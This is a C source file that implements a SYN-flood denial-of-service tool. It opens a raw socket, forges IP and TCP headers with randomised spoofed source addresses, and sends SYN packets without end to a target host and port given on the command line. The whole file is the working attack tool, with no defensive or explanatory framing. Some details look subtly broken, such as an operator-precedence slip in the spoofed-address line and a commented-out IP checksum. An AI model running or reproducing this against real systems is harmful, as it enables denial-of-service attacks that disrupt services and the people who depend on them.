#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>


void attack(int skfd,struct sockaddr_in *target);

unsigned short check_sum(unsigned short *addr,int len);
unsigned short get_ip_checksum(char* ip_hdr);

int main(int argc,char** argv)
{
        int skfd;	
        struct sockaddr_in target; 
        struct hostent *host;		
        const int on=1;

        if(argc!=3)
        {				
                printf("Usage:%s target dstport\n",argv[0]);
                exit(1);
        }
		
		
        bzero(&target,sizeof(struct sockaddr_in));
        target.sin_family=AF_INET;
        target.sin_port=htons(atoi(argv[2]));

        if(inet_aton(argv[1],&target.sin_addr)==0)
        {
                host=gethostbyname(argv[1]);
                if(host==NULL)
                {
                        printf("TargetName Error:%s\n",hstrerror(h_errno));
                        exit(1);
                }
                target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
        }

     
        if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))){
                perror("Create Error");
                exit(1);
        }

	
         if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
                perror("IP_HDRINCL failed");
                exit(1);
        }

        setuid(getpid());
        attack(skfd,&target);
}

void attack(int skfd,struct sockaddr_in *target)
{
        char buf[128]={0};
        struct ip *ip;
        struct tcphdr *tcp;
        int ip_len;
        ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
		
        ip=(struct ip*)buf;
        ip->ip_v = IPVERSION;				
        ip->ip_hl = sizeof(struct ip)>>2;			
        ip->ip_len = htons(ip_len);			
        ip->ip_ttl=MAXTTL;					
        ip->ip_p=IPPROTO_TCP;			

     
        tcp = (struct tcphdr*)(buf+sizeof(struct ip));
		
        tcp->source = (unsigned short)random()%60000+1000;	
        tcp->dest = target->sin_port;		
        tcp->seq = random();			
        tcp->doff = 5;					
        tcp->syn = 1;
	for(;;)
	{
                ip->ip_src.s_addr = random()<<16+random();
		//ip->ip_sum=get_ip_checksum((char*)ip);
                tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
                sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
	}			
  
}

unsigned short check_sum(unsigned short *addr,int len)
{
        register int nleft=len;
        register int sum=0;
        register short *w=addr;
        short answer=0;

        while(nleft>1)
        {
                sum+=*w++;
                nleft-=2;
        }
        if(nleft==1)
        {
                *(unsigned char *)(&answer)=*(unsigned char *)w;
                sum+=answer;
        }

        sum=(sum>>16)+(sum&0xffff); 
        sum+=(sum>>16);				
        answer=~sum;			 
        return(answer);
}


unsigned short get_ip_checksum(char* ip_hdr)
{
    char* ptr_data = ip_hdr; 
    u_long  tmp = 0; 
    u_long  sum = 0; 
    for (int i=0; i<20; i+=2)
    {
        tmp += (u_char)ptr_data[i] << 8; 
        tmp += (u_char)ptr_data[i+1]; 
        sum += tmp; 
        tmp = 0; 
    }
    u_short lWord = sum & 0x0000FFFF; 
    u_short hWord = sum >> 16; 
    u_short checksum = lWord + hWord; 
    checksum = ~checksum; 
    return checksum; 
}
